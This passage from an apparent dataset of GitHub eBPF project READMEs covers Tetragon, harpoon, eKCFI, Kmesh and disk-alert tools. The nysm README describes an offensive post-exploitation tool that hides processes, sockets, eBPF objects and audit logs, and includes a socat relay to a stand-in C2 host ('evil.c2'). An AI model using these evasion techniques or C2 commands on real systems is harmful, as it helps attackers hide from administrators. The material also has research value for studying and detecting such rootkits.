![ssh_1](https://github.com/qjawls2003/eBPF-Remote-Client-Tracing/assets/35247051/b326e22a-7ac5-4f98-9535-d18f6d5b02c2)

### IPv6
![ssh_3](https://github.com/qjawls2003/eBPF-Remote-Client-Tracing/assets/35247051/b7bb856a-b762-498f-b2a3-da6df836dc1b)
"
camptocamp/tetragon-policy-builder,8,2,8,0,JavaScript,Generate TracingPolicies based on Tetragon events,2023-08-23T12:33:00Z,2025-07-29T16:24:59Z,61,"<picture>
  <source media=""(prefers-color-scheme: light)"" srcset=""https://raw.githubusercontent.com/camptocamp/tetragon-policy-builder/master/static/logo.png"" width=""200"">
  <img src=""https://raw.githubusercontent.com/camptocamp/tetragon-policy-builder/master/static/logo.png"" width=""200"">
</picture>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a href=""https://github.com/camptocamp/tetragon-policy-builder/blob/master/screenshot1.png"">
  <picture style=""margin-left: 100px;"">
    <source media=""(prefers-color-scheme: light)"" srcset=""https://raw.githubusercontent.com/camptocamp/tetragon-policy-builder/master/screenshot2.png"" height=""200"">
    <img src=""https://raw.githubusercontent.com/camptocamp/tetragon-policy-builder/master/static/screenshot2.png"" height=""200"">
  </picture>
</a>

# Tetragon Policy Builder

This tool is a proof-of-concept tool, which profiles apps running in k8s,
and issues TracingPolicies allowing only processes run under the profiles.

It parses output from Tetragon and creates Cilium TracingPolicies, which
enable only, per namespace, per workloads, some whitelisted processes.

[Tetragon](https://github.com/cilium/tetragon) *MUST* be running in the
kubernetes cluster with the `tetragon.enablePolicyFilter: true`
[value](https://tetragon.cilium.io/docs/reference/helm-chart/#values).

## Deploy Tetragon

Check the [Quick Start guide](https://tetragon.cilium.io/docs/getting-started/kubernetes-quickstart-guide/):

```bash
$ helm repo add cilium https://helm.cilium.io
$ helm repo update
$ helm install tetragon cilium/tetragon -n kube-system --set tetragon.enablePolicyFilter=true
```

## Deploy the policy builder

### Using helm

```bash
$ git clone https://github.com/camptocamp/tetragon-policy-builder.git
$ cd tetragon-policy-builder
$ helm install -n kube-system policy-builder helm/tetragon-policy-builder
```

Then you can open a ""port-forward"" to access the web UI:

```bash
kubectl port-forward -n kube-system deploy/policy-builder 5000:5000
```

and access the interface with your wen browser: [http://localhost:5000/](http://localhost:5000/)

After uninstalling with helm:

```bash
$ helm uninstall -n kube-system policy-builder
```

You will need to cleanup some configmap created by the policy builder, you can
list configmaps with:

``` bash
$ kubectl get cm -A -l generated-by=tetragon-policy-builder
```

and then delete configmap with:

```bash
$ kubectl delete cm -A -l generated-by=tetragon-policy-builder
```

## Using Docker

The docker container will need to authenticate to the kubernetes. You will need
to share the kubeconfig to the container:

```bash
$ docker run -p 5000:5000 -e KUBECONFIG=/tmp/kubeconfig -v $KUBECONFIG:/tmp/kubeconfig ghcr.io/camptocamp/tetragon-policy-builder:master
```

Be sure to cleanup configmap created by the policy builder with:

```bash
$ kubectl delete cm -A -l generated-by=tetragon-policy-builder
```

Use you web browser to access the interface: [http://localhost:5000/](http://localhost:5000/)

## Directly on the workstation for dev purpose

```bash
$ git clone https://github.com/camptocamp/tetragon-policy-builder.git
$ cd tetragon-policy-builder
$ virtualenv venv
$ . venv/bin/activate
$ pip install -r /path/to/requirements.txt
$ python3 -m builder
```

Ensure that you have access to a kubernetes cluster:

```bash
$ kubectl cluster-info
Kubernetes control plane is running at https://e07df10a-56d2-11ee-bd90-a77949f1c0d2.sks-de-fra-1.exo.io:443
CoreDNS is running at https://e07df10a-56d2-11ee-bd90-a77949f1c0d2.sks-de-fra-1.exo.io:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy

To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
```

Launch the policy builder:
```bash
python3 -m builder
```

Open the web interface: [http://localhost:5000/](http://localhost:5000/)

Be sure to cleanup configmap created by the policy builder with:

```bash
$ kubectl delete cm -A -l generated-by=tetragon-policy-builder
```
"
alegrey91/harpoon,169,11,169,10,C,ðŸ” Seccomp profiling and function-level tracing tool.,2023-09-20T19:42:52Z,2025-10-10T05:27:37Z,116,"# Harpoon

<p align=""center"">
    <img src=""harpoon.png"" alt=""gopher"" width=""200""/>
</p>

**Harpoon** aims to capture the syscalls (as if they were fishes) from the execution flow (the river) of a single user-defined function.

[![Awesome eBPF](https://awesome.re/badge.svg)](https://github.com/zoidyzoidzoid/awesome-ebpf?tab=readme-ov-file#security)

## Introduction

This tool is designed to provide fine-grained visibility into the syscalls made by specific functions within a program. Unlike traditional system call tracing tools like `strace`, which capture all syscalls made during the entire program's execution, this project leverages the power of **eBPF** to pinpoint and monitor system calls exclusively within targeted functions.

## Getting Started

First of all, let's identify the symbol of the function you want to trace from the binary. Suppose you want to trace the function `doSomething()` present in the example program `./binary`. In order to get the symbol from the binary itself, you need to use the following command:

```sh
objdump --syms ./binary | grep doSomething
0000000000480720 g     F .text  0000000000000067 main.doSomething
```

So, `main.doSomething` is the symbol of the function we want to trace using `harpoon`.

Then, let's run `harpoon` to extract the syscalls from the function `main.doSomething`:

```shell
harpoon capture -f main.doSomething -- ./binary
read
sigaltstack
gettid
close
mmap
fcntl
write
futex
openat
clone
getrlimit
```

These are the syscalls that have been executed by the traced function!

**Documentation:**

* [Commands](docs/commands.md)
* [Tutorials](docs/tutorials.md)

## Installation

To install `harpoon` you currently have 2 options:

### Download

You can easily download the latest release using the installation script:

```sh
curl -s https://raw.githubusercontent.com/alegrey91/harpoon/main/install | sudo bash
```

Alternatively, if you want to customize your installation, use the following flags:

```sh
curl -s https://raw.githubusercontent.com/alegrey91/harpoon/main/install | sudo bash -s -- --install-version v0.9 --install-dir ~/.local/bin/
```

(If your current version is `<= v0.8.2`, remove it from `/usr/local/bin/` before installing the new one).

### Build

Or you can build `harpoon` manually by using the following steps:

Install dependencies (for Ubuntu):

* `clang`
* `libbpf-dev`
* `libseccomp-dev`
* `linux-tools-generic` (for `bpftool`)

Build the application:

```sh
make build
```

After the build is completed, you can find the executable under the `bin/` directory.

## Debugging

In case you want to run the application locally, I've provided the [`.vscode/launch.json`](.vscode/launch.json) file to easily debug the application with `root` privileges in `vscode`.

## Talks

I had the pleasure of speaking about `harpoon` at the following conferences:

* [**GOLAB**](https://www.youtube.com/watch?v=A5A_Ll9o1Rc) (Nov 24)
* [**Conf42**](https://www.youtube.com/watch?v=Z8IHOTlG3pM) (Apr 24)
* [**FOSDEM**](https://fosdem.org/2024/schedule/event/fosdem-2024-1884-how-we-almost-secured-our-projects-by-writing-more-tests/) (Feb 24)

## Adopters

This is a list of projects that are using `harpoon` for generating **Seccomp** profiles on their pipeline:

* [**alegrey91/fwdctl**](https://github.com/alegrey91/fwdctl)
* [**projectcapsule/capsule**](https://github.com/projectcapsule/capsule)

## References

I would like to point out that without the references mentioned below this project would never have come to life.
As a result, the code draws significant inspiration from the references listed here:

* https://www.grant.pizza/blog/tracing-go-functions-with-ebpf-part-1/
* https://itnext.io/seccomp-in-kubernetes-part-2-crafting-custom-seccomp-profiles-for-your-applications-c28c658f676e
* https://github.com/containers/oci-seccomp-bpf-hook
* https://sysdig.com/blog/ebpf-offensive-capabilities/
* *Liz Rice. Learning eBPF, 173-176. O'Reilly, 2023*

"
hardos-ebpf-fuzzing/ekcfi,3,0,3,0,Rust,,2023-09-27T20:44:20Z,2025-09-24T11:19:12Z,6,"# KCFI-EBPF

## Getting Started

### Build

This repo contains submodules and needs to be initiated:
```bash
git submodule update --init --recursive --progress
```

Build trace proecess tool:
```bash
cd parse_trace
cargo build -r
cd -
```
The tool requires `rust` toolchain to build, you can install it with `rustup`:
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
```

Next build LLVM:
```bash
mkdir -p llvm-project/build && cd llvm-project/build
cmake -GNinja -DCMAKE_BUILD_TYPE=RelWithDebInfo -DCMAKE_C_COMPILER=gcc -DCMAKE_CXX_COMPILER=g++ -DLLVM_ENABLE_PROJECTS=""clang;lld"" -DLLVM_TARGETS_TO_BUILD=X86 -DLLVM_ENABLE_ASSERTIONS=ON -DCMAKE_C_FLAGS=-pipe -DCMAKE_CXX_FLAGS=-pipe ../llvm
ninja
cd -
```
The built LLVM binaries (`clang`, `llvm-ar`, `lld`, etc) are under
`llvm-project/build/bin`.

Build kernel and `libbpf`:
```bash
cd linux
export PATH=`realpath ../llvm-project/build/bin`:$PATH
make LLVM=1 oldconfig
make LLVM=1 -j`nproc`
make -C tools/lib/bpf -j`nproc`
```

Then build the userspace control tools of eKCFI:
```bash
make trace trace_kern.o -C ebpf
cd ekcfi_test
cargo build -r
cd -
```

Finally build our kernel module
```bash
cd mod
make LLVM=1
cd -
```

### Obtaining indirect call trace

Boot into the kernel:
```bash
# In kernel directory
`realpath ../yifei-q`
```
The VM console will open if everything works correctly:
```console
root@q:~/linux#
```

Prepare for trace
```bash
insmod ../mod/ekcfi.ko # Inserts our module
../ebpf/trace # Installs the tracing eBPF program
../ekcfi_test/target/release/ekcfi_test -mtrace vmlinux # Patches all nops generated by clang
```

We will use `uname` as an example:
```bash
uname -a
```

The result can be read from
`/sys/kernel/debug/tracing/trace`:
```bash
cat /sys/kernel/debug/tracing/trace | grep uname > trace_data.txt
```

#### Note
  1. Due to the indeterministic nature of the scheduler, it is a good idea to
     run `uname` a few times to better capture indirect calls in the scheduler
  2. To apply on another program, several files needs to be changed because
     `uname` is hard-coded at this point. Namely these includes:
     - [ebpf/trace_kern.c:9](https://github.ibm.com/hardos/kcfi-ebpf/blame/master/ebpf/trace_kern.c#L9)
     - [ebpf/policy_kern.c:11](https://github.ibm.com/hardos/kcfi-ebpf/blame/master/ebpf/trace_kern.c#L11)
     - [ebpf/Makefile:36](https://github.ibm.com/hardos/kcfi-ebpf/blame/master/ebpf/Makefile#L36)

Once finished, the VM can be shutdown by pressing control-D. Due to how the
`overlayfs` is mounted in the VM, any changes to the kernel directory will
reflect on the host (but changes to other directories will not).

Also, because this research prototype does currently does not cleanup module
resource when unloading, VM actually needs to be shutdown after the previous
step to avoid problems.

### Enforce KCFI based on obtained trace

Build the trace parsing tool
```bash
cd parse_trace
cargo build -r
cd -
```

Build the policy eBPF program
```bash
mv linux/trace_data.txt ebpf/
make -C ebpf
```
The `policy_kern.c` program implements an example policy: for each indirect
call from a particular program (in this case `uname`) it check whether the
call is valid (i.e. whether the caller-callee pair has appeared in the
trace). It triggers a kernel panic upon check failure.

Boot the kernel again:
```bash
# In kernel directory
`realpath ../yifei-q`
```

Then run the following to set up KCFI:
```bash
insmod ../mod/ekcfi.ko # Inserts our module
../ebpf/trace # Installs the policy eBPF program
../ekcfi_test/target/release/ekcfi_test -mtrace vmlinux # Patches all nops generated by clang
```

Now execute `uname`
```bash
uname -a
```

If nothing shows up it is probably correct (since a panic will happen if check
fails).

### Other notes
- The userspace tools should be able to be easily rewritten in C (now it's Rust).
- There is an ugly hack in the module which relies on privilegged userspace to
  read out the address of symbols not exported by the kernel. This is because of
  our design principle to not modify the kernel source code. If we were to
  implement the framework in-tree, then this hack is not needed at all."
kmesh-net/kmesh,679,131,679,196,Go,High Performance ServiceMesh Data Plane Based on eBPF and Programmable Kernel,2023-07-12T05:00:17Z,2025-10-12T18:53:19Z,2987,"<img src=""docs/pics/logo/KMESH-horizontal-colour.png"" alt=""kmesh-logo"" style=""zoom: 100%;"" />

[![LICENSE](https://img.shields.io/github/license/kmesh-net/kmesh)](/LICENSE) [![codecov](https://codecov.io/gh/kmesh-net/kmesh/graph/badge.svg?token=0EGQ84FGDU)](https://codecov.io/gh/kmesh-net/kmesh)

## Introduction

Kmesh is a high-performance and low overhead service mesh data plane based on eBPF and programmable kernel. Kmesh brings traffic management, security and monitoring to service communication without needing application code changes. It is natively sidecarless, zero intrusion and without adding any resource cost to application container.

## Why Kmesh

### Challenges of the Service Mesh Data Plane

Service mesh software represented by Istio has gradually become popular and become an important component of cloud native infrastructure. However, there are still some challenges faced:

- **Extra latency overhead at the proxy layer**: Add [2~3ms](https://istio.io/v1.19/docs/ops/deployment/performance-and-scalability/) latency, which cannot meet the SLA requirements of latency-sensitive applications. Although the community has come up with a variety of optimizations, the overhead introduced by sidecar cannot be completely reduced.
- **High resources occupation**: Occupy 0.5 vCPU and 50 MB memory per 1000 requests per second going through the proxy, and the deployment density of service container decreases.

### Kmesh Architecture

Kmesh transparently intercept and forward traffic based on node local eBPF without introducing extra connection hops, both the latency and resource overhead are negligible.

<div align=""center"">
    <img src=""docs/pics/kmesh-arch.svg"" alt=""kmesh-arch"" width=""800"" />
    <p>Kmesh Architecture</p>
</div>

The main components of Kmesh include:

- **Kmesh-daemon**: The management component per node responsible for bpf prog management, xDS configuration subscribe, observability, and etc.
- **eBPF Orchestration**: The traffic orchestration implemented based on eBPF, supports L4 load balancing, traffic encryption, monitoring and simple L7 dynamic routing.
- **Waypoint**: Responsible for advanced L7 traffic governance, can be deployed separately per namespace, per service.

Kmesh innovatively sinks Layer 4 and Simple Layer 7 (HTTP) traffic governance to the kernel, and build a transparent sidecarless service mesh without passing through the proxy layer on the data path. We named this Kernel-Native mode.

<div align=""center"">
    <img src=""docs/pics/kernel-native-mode.png"" alt=""kernel-native-mode"" width=""800"" />
    <p>Kernel-Native Mode</p>
</div>

Kmesh also provide a Dual-Engine Mode, which makes use of eBPF and waypoint to process L4 and L7 traffic separately, thus allow you to adopt Kmesh incrementally, enabling a smooth transition from no mesh, to a secure L4, to full L7 processing.

<div align=""center"">
    <img src=""docs/pics/dual-engine-mode.png"" alt=""dual-engine-mode"" width=""800"" />
    <p>Dual-Engine Mode</p>
</div>

### Key features of Kmesh

#### Smooth Compatibility

- Application-transparent Traffic Management

#### High Performance

- Forwarding delay **60%â†“**
- Workload startup performance **40%â†‘**

#### Low Resource Overhead

- ServiceMesh data plane overhead **70%â†“**

#### Zero Trust

- Provide zero trust security with default mutual TLS
- Policy enforcement both in eBPF and waypoints

#### Safety Isolation

- eBPF Virtual machine security
- Cgroup level orchestration isolation

#### Open Ecology

- Supports XDS protocol standards
- Support [Gateway API](https://gateway-api.sigs.k8s.io/)

## Quick Start

Please refer to [quick start](https://kmesh.net/en/docs/setup/quick-start/) and [user guide](docs/kmesh_demo.md) to try Kmesh quickly.

## Performance

Based on [Fortio](https://github.com/fortio/fortio), the performance of Kmesh and Envoy was tested. The test results are as follows:

![fortio_performance_test](docs/pics/fortio_performance_test.png)

For a complete performance test result, please refer to [Kmesh Performance Test](test/performance/README.md).

## Contact

If you have any question, feel free to reach out to us in the following ways:

- [meeting notes](https://docs.google.com/document/d/1fFqolwWMVMk92yXPHvWGrMgsrb8Xru_v4Cve5ummjbk)
- [mailing list](https://groups.google.com/forum/#!forum/kmesh)
- [slack](https://cloud-native.slack.com/archives/C06BU2GB8NL)
- [twitter](https://twitter.com/kmesh_net)

## Community Meeting

Regular Community Meeting:

- Thursday at 16:00 UTC+8 (Chinese)(weekly). [Convert to your timezone](https://www.thetimezoneconverter.com/?t=14%3A30&tz=GMT%2B8&).

Resources:

- [Meeting Link](https://zoom-lfx.platform.linuxfoundation.org/meeting/99299011908?password=f4c31ddd-11ed-42ae-a617-3e0842c39c58)

## Contributing

If you're interested in being a contributor and want to get involved in developing Kmesh, please see [CONTRIBUTING](CONTRIBUTING.md) for more details on submitting patches and the contribution workflow.

## License

The Kmesh user space components are licensed under the
[Apache License, Version 2.0](./LICENSE).
The BPF code templates, ko(kernel module) and mesh data accelerate are dual-licensed under the
[General Public License, Version 2.0 (only)](./bpf/LICENSE.GPL-2.0)
and the [2-Clause BSD License](./bpf/LICENSE.BSD-2-Clause)
(you can use the terms of either license, at your option).

## Credit

This project was initially incubated in the [openEuler community](https://gitee.com/openeuler/Kmesh), thanks openEuler Community for the help on promoting this project in early days.
"
eeriedusk/nysm,261,40,261,0,C,nysm is a stealth post-exploitation container.,2023-09-25T10:03:52Z,2025-10-07T09:11:01Z,8,"<h1 align=""center"">nysm</h1>

<p align=""center"">
    <img alt=""nysm"" src="".img/250x250.png"" width=""200"">
</p>

<p align=""center"">
    A stealth post-exploitation container.
</p>

## Table of Content

- [1. Introduction](#introduction)
- [2. Installation](#installation)
    - [2.1 Requirements](#requirements)
    - [2.2 Linux headers](#linux-headers)
    - [2.3 Build](#build)
- [3. Usage](#usage)
    - [3.1 Examples](#examples)
- [4. How it works](#how-it-works)
    - [4.1 In general](#in-general)
    - [4.2 Hide eBPF objects](#hide-ebpf-objects)
    - [4.3 Hide Auditd logs](#hide-auditd-logs)
    - [4.4 Hide PIDs](#hide-pids)
    - [4.5 Hide sockets](#hide-sockets)
- [5. Limitations](#limitations)

## Introduction

With the raise in popularity of offensive tools based on eBPF, going from credential stealers to rootkits hiding their own PID, a question came to our mind: *Would it be possible to make eBPF invisible in its own eyes?* From there, we created nysm, an eBPF stealth container meant to make offensive tools fly under the radar of System Administrators, not only by hiding eBPF, but much more:

- bpftool
- bpflist-bpfcc
- ps
- top
- sockstat
- ss
- rkhunter
- chkrootkit
- lsof
- auditd
- *etc...*

All these tools go blind to what goes through nysm. It hides:

- New eBPF programs âš™ï¸
- New eBPF maps ðŸ—ºï¸
- New eBPF links ðŸ”—
- New Auditd generated logs ðŸ“°
- New PIDs ðŸªª
- New sockets ðŸ”Œ

> **Warning**
> This tool is a simple demonstration of eBPF capabilities as such. It is not meant to be exhaustive. Nevertheless, pull requests are more than welcome.

## Installation

### Requirements

```bash
sudo apt install git make pkg-config libelf-dev libzstd-dev clang llvm bpftool -y
```

### Linux headers

```bash
cd ./nysm/src/
bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h
```

### Build

```bash
cd ./nysm/src/
make
```

## Usage

nysm is a simple program to run before the intended command:

```
Usage: nysm [OPTION...] COMMAND
Stealth eBPF container.

  -d, --detach               Run COMMAND in background
  -r, --rm                   Self destruct after execution
  -v, --verbose              Produce verbose output
  -h, --help                 Display this help
      --usage                Display a short usage message
```

### Examples

Run a hidden `bash`:

```bash
./nysm bash
```

Run a hidden `ssh` and remove `./nysm`:

```
./nysm -r ssh user@domain
```

Run a hidden `socat` as a daemon and remove `./nysm`:

```bash
./nysm -dr socat TCP4-LISTEN:80 TCP4:evil.c2:443
```

## How it works

### In general

As eBPF *cannot* overwrite returned values or kernel addresses, our goal is to find the lowest level call interacting with a userspace address to overwrite its value and hide the desired objects.

To differentiate nysm events from the others, everything runs inside a seperated PID namespace.

### Hide eBPF objects

`bpftool` has some features nysm wants to evade: `bpftool prog list`, `bpftool map list` and `bpftool link list`.

As any eBPF program, `bpftool` uses the `bpf()` system call, and more specifically with the `BPF_PROG_GET_NEXT_ID`, `BPF_MAP_GET_NEXT_ID` and `BPF_LINK_GET_NEXT_ID` commands. The result of these calls is stored in the userspace address pointed by the `attr` argument.

To overwrite `uattr`, a tracepoint is set on the `bpf()` entry to store the pointed address in a map. Once done, it waits for the `bpf()` exit tracepoint. When `bpf()` exists, nysm can read and write through the [bpf_attr](https://elixir.bootlin.com/linux/v6.4/source/include/uapi/linux/bpf.h#L1320) structure. After each `BPF_*_GET_NEXT_ID`, `bpf_attr.start_id` is replaced by `bpf_attr.next_id`.

In order to hide specific IDs, it checks `bpf_attr.next_id` and replaces it with the next ID that was not created in nysm.

Program, map, and link IDs are collected from [security_bpf_prog()](https://elixir.bootlin.com/linux/v6.4/source/security/security.c#L5092), [security_bpf_map()](https://elixir.bootlin.com/linux/v6.4/source/security/security.c#L5077), and [bpf_link_prime()](https://elixir.bootlin.com/linux/v6.4/source/kernel/bpf/syscall.c#L2867).

### Hide Auditd logs

Auditd receives its logs from `recvfrom()` which stores its messages in a buffer.

If the message received was generated by a nysm process through [audit_log_end()](https://elixir.bootlin.com/linux/latest/source/kernel/audit.c#L2399), it replaces the message length in its `nlmsghdr` header by 0.

### Hide PIDS

Hiding PIDs with eBPF is nothing new. nysm hides new `alloc_pid()` PIDs from `getdents64()` in `/proc` by changing the length of the previous record.

As `getdents64()` requires to loop through all its files, the eBPF instructions limit is easily reached. Therefore, nysm uses [tail calls](https://docs.cilium.io/en/stable/bpf/architecture/#tail-calls) before reaching it.

### Hide sockets

Hiding sockets is a big word. In fact, opened sockets are already hidden from many tools as they cannot find the process in `/proc`. Nevertheless, `ss` uses `socket()` with the `NETLINK_SOCK_DIAG` flag which *returns* all the currently opened sockets. After that, `ss` receives the result through `recvmsg()` in a message buffer and the returned value is the length of all these messages combined.

Here, the same method as for the PIDs is applied: the length of the previous message is modified to hide nysm sockets.

These are collected from the `connect()` and `bind()` calls.

## Limitations

Even with the best effort, nysm still has some limitations.

- Every tool that does not close their file descriptors will spot nysm processes created while they are open. For example, if `./nysm bash` is running before `top`, the processes will not show up. But, if another process is created from that `bash` instance while `top` is still running, the new process will be spotted. The same problem occurs with sockets and tools like nethogs.

- Kernel logs: `dmesg` and `/var/log/kern.log`, the message `nysm[<PID>] is installing a program with bpf_probe_write_user helper that may corrupt user memory!` will pop several times because of the eBPF verifier on nysm run.

- Many traces written into files are left as hooking `read()` and `write()` would be too heavy (but still possible). For example `/proc/net/tcp` or `/sys/kernel/debug/tracing/enabled_functions`.

- Hiding `ss` `recvmsg` can be challenging as a new socket can pop at the beginning of the buffer, and nysm cannot hide it with a preceding record *(this does not apply to PIDs)*. A quick fix could be to switch place between the first one and the next legitimate socket, but what if a socket is in the buffer by itself? Therefore, nysm modifies the first socket information with hardcoded values.

- Running `bpf()` with any kind of `BPF_*_GET_NEXT_ID` flag from a nysm child process should be avoided as it would hide every non-nysm eBPF objects.

Of course, many of these limitations must have their own solutions. Again, pull requests are more than welcome.
"
Lakshmipathi/ebpf-diskalert,25,0,25,0,C,"eBPF based tool to monitor disk usage, perform actions when threshold breached.",2023-10-09T05:30:11Z,2025-07-26T18:06:52Z,14,"# ebpf-diskalert

As the name suggests, ebpf-diskalert is a tool designed for monitoring disk usage and triggering actions 
when specific thresholds are exceeded.

Usage
-----

To start using ebpf-diskalert:


`$ sudo ebpf-diskalert -c /path/to/config.toml`

where `config.toml` has following contents

```
devicename = ""/dev/sda1""
diskusage_threshold = 90
action = ""/path/to/nofity.sh""
repeat_action = 1
```

Here's an explanation of the configuration options:




    - devicename: Specify the device to monitor (e.g., ""/dev/sda1"").
    - diskusage_threshold: Set the disk usage threshold at which the action should be triggered (e.g., 90%).
    - action: Specify the binary or script to execute when the threshold is breached (e.g., ""notify.sh"").
    - repeat_action: Define how often the specified action should be repeated. In this example, it is set to 1, meaning the action will execute only once.
      If you set repeat_action = 10, ebpf-diskalert will execute the defined action for every write operation on the ""/dev/sda1"" device when disk usage surpasses 90%.

Demo
----
In this demonstration, you'll observe that when the disk usage, as indicated by `df -h`, surpasses the specified 20% threshold as defined in `/root/c.toml`, the system automatically runs `lvm_extend.sh` to expand the disk capacity. You can confirm this disk size expansion by monitoring the top-right `df -h /mnt` output as it increases when the usage crosses the 20% threshold.

https://github.com/Lakshmipathi/ebpf-diskalert/assets/624948/57c6924a-1117-4356-af26-d2b67cefc72e

Please take note of the following:
The ext4 file system has a default configuration where `5%` of the blocks are reserved for the root user. These reserved blocks are counted as used when you check the file system using the `df` command. In other words, if `df` displays `100%` usage, only `95%` of the space is actually utilized, with the remaining `5%` reserved for the root user. It's important to mention that ebpf-diskalert considers the `5%` reserved block as available space.

If you plan to trigger an action based on the output of the `df` command, you should set your threshold to be `5%` less than your desired usage percentage. For instance, if you want `ebpf-diskalert` to trigger action when df shows `70%` usage, set the `diskusage_threshold` to `65`. In the demonstration above, I removed any reserved blocks from the device using the following command: `tune2fs -m0 /dev/partition`.

Installation
------------
Download the `ebpf-diskalert` binary from this repo and copy it under `/usr/sbin` Then set appropriate permission. `chmod 500 /usr/sbin/ebpf-diskalert` and run it.

Test Results
------------

Results from different kernel versions listed below. Please note that I didn't have time to explore the failure further, It may be simple bug, please feel free to explore and
send a PR :-) 

| Version   | Result |
|-----------|:------:|
| 5.4.0     | Fail   |
| 5.15.0    | Fail   |
| 5.14.21   | Pass   |
| 6.2.0     | Pass   |
| 6.3.5     | Pass   |
| 6.5.0     | Pass   |
 
  
Reporting bugs:
--------------

To report issues please use [github issue track](https://github.com/lakshmipathi/ebpf-diskalert/issues)
"
littlejo/awesome-french-cilium,8,0,8,0,,Together all French contents,2023-10-05T10:09:48Z,2025-06-18T09:07:55Z,9,"# LienothÃ¨que sur Cilium

## Sites

* [eBPF site officiel](https://ebpf.io/fr-fr/)

## Blogs

### Filador

* [Un peu de Cilium dans votre cluster Kubernetes](https://blog.filador.fr/un-peu-de-cilium-dans-votre-cluster-kubernetes/)

### Wescale

* [Introduction Ã  Cilium](https://blog.wescale.fr/introduction_a_cilium)
* [Cilium CNI deep dive politiques rÃ©seaux](https://blog.wescale.fr/cilium-cni-deep-dive-politiques-r%C3%A9seaux)
* [Cilium CNI deep dive usages avancÃ©es](https://blog.wescale.fr/cilium-cni-deep-dive-usages-avanc%C3%A9s)

### Zwindler

* [K3S et Cilium rapide et facile](https://blog.zwindler.fr/2023/09/01/k3s-et-cilium-rapide-et-facile/)
* [K3S ajouter monitoring](https://blog.zwindler.fr/2023/09/15/k3s-ajouter-monitoring/)
* [Migration du routage de cilium de iptables vers eBPF... Ã  chaud !](https://blog.zwindler.fr/2023/10/20/migration-routage-cilium-iptables-ebpf/)

### Lydra

* [SÃ©curitÃ© des applications cloud via le rÃ©seau avec Cilium & eBPF | Live Meetup avec RaphaÃ«l Pinson](https://lydra.fr/securite-des-applications-cloud-via-le-reseau-avec-cilium-ebpf-live-meetup-avec-raphael-pinson/)

### Joseph Ligier

#### Cilium dans EKS

* [Introduction Ã  Cilium dans EKS](https://medium.com/@littel.jo/mon-%C3%A9t%C3%A9-avec-cilium-et-eks-partie-1-99a66ed6671f)
* [Installation avec helm](https://medium.com/@littel.jo/mon-%C3%A9t%C3%A9-avec-cilium-et-eks-partie-2-ea8ba7a9dcae)
* [ENI et delegation de prÃ©fixe](https://medium.com/@littel.jo/mon-%C3%A9t%C3%A9-avec-cilium-et-eks-partie-3-2e3d6882e643)
* [Chaining mode et gestion de la bande passante](https://medium.com/@littel.jo/mon-%C3%A9t%C3%A9-avec-cilium-et-eks-partie-4-d45f3829ca82)
* [Mode overlay](https://medium.com/@littel.jo/mon-%C3%A9t%C3%A9-avec-cilium-et-eks-partie-5-118814fd100c)
* [Mode sans kube-proxy](https://medium.com/@littel.jo/mon-%C3%A9t%C3%A9-avec-cilium-et-eks-partie-6-a393c9701c12)
* [Bilan de la sÃ©rie](https://medium.com/@littel.jo/mon-%C3%A9t%C3%A9-avec-cilium-et-eks-%C3%A9pilogue-e563e40aeab2)

#### Cilium dans AKS

* [Introduction Ã  Cilium avec AKS et Ã  Terraform](https://medium.com/@littel.jo/d%C3%A9ployer-cilium-et-aks-avec-terraform-partie-1-c74930cf8f0e)
* [Observation de Cilium managÃ© par Azure](https://medium.com/@littel.jo/d%C3%A9ployer-cilium-et-aks-avec-terraform-partie-2-6b82ed8daf30)

#### News

* [Sortie de Cilium 1.14](https://medium.com/@littel.jo/sortie-de-cilium-1-14-ce22d2bfd8d9)

## Videos

### Les compagnons du devops

* [SÃ©curitÃ© des applications cloud via le rÃ©seau avec Cilium & eBPF | Live Meetup avec RaphaÃ«l Pinson](https://www.youtube.com/watch?v=JJ1bFnJenms)

### KCD France

* [RÃ©volution eBPF : Un noyau Linux dynamique - R. Pinson, Isovalent](https://www.youtube.com/watch?v=BO4MWeFkvRM&list=PLDg_GiBbAx-kRQ2Aq5YTh15wIpYB2QiiG)
* [Une courte introduction sur Cilium et ses apports dans EKS - R. Laifa, Devoteam Revolve](https://www.youtube.com/watch?v=w-TrtMt_Cuk&list=PLDg_GiBbAx-kRQ2Aq5YTh15wIpYB2QiiG&index=2)
* [Goldie d'or et les trois CNI - J. Masson, WeScale](https://www.youtube.com/watch?v=opgQN2MxlvA&list=PLDg_GiBbAx-kRQ2Aq5YTh15wIpYB2QiiG&index=3)

### eCHO

* [Episode 86: Cilium en franÃ§ais!](https://www.youtube.com/watch?v=WtGYlsAMq4A&list=PLDg_GiBbAx-kRQ2Aq5YTh15wIpYB2QiiG&index=4)

### Devoxx

* [Cilium: one firewall ðŸ”¥ to secure them all (P.Y. Aillet & E. Briand)](https://www.youtube.com/watch?v=h6V01cVSk-8)

### Breizh Camp

* [Comprendre eBPF, ses applications et ses limites (Paul Chaignon)](https://www.youtube.com/watch?v=ZIwvoZId_g4&t=1s)

### Wescale

* [Meetup Cilium & Sysdig Secure](https://www.youtube.com/live/C1YkK_C6wvQ?si=7BEAM6Jlmzz0xvaf)

### meetup Grafana

* [Grafana & Cilium: De lâ€™observabilitÃ© avec des super-pouvoirs - Youssef Azrak @ Isovalent](https://www.youtube.com/watch?v=n2YJhFOQKyY)
* 

### FRnOG 2024

* [FRnOG 39 - Paul Chaignon : Cilium - Le meilleur de Linux pour vos rÃ©seaux Kubernetes](https://www.dailymotion.com/video/x8xm6kq)

## Podcasts

### Electro Monkeys

* [Cilium, plus quâ€™un CNI Kubernetes grÃ¢ce Ã  eBPF avec Robin Hahling et RaphaÃ«l Pinson](https://medium.com/electro-monkeys/cilium-plus-quun-cni-kubernetes-gr%C3%A2ce-%C3%A0-ebpf-avec-robin-hahling-et-rapha%C3%ABl-pinson-b50877b1eae1)
"
xxradar/cilium-clustermesh-multi-region-with-fortigate,4,3,4,0,HCL,,2023-09-17T09:15:42Z,2023-10-25T11:56:04Z,147,"# A multi-region Cilium Clustermesh using Fortigate VPN in AWS
## Introduction
<p align=""center"">
<img src=""./images/clustermesh.png""  width=""800"" />
</p> <br>

## Setting up the network and fortigate infrastructure
Next terraform plan will create a public and private network and deploy a PAYG fortigate instance.<br>
Rename `terraform.tfvars.example` to `terraform.tfvars` and populate the variables. <br>
Deployment will happen in AWS region `eu-west-3`.
```
cd fgtsingle1
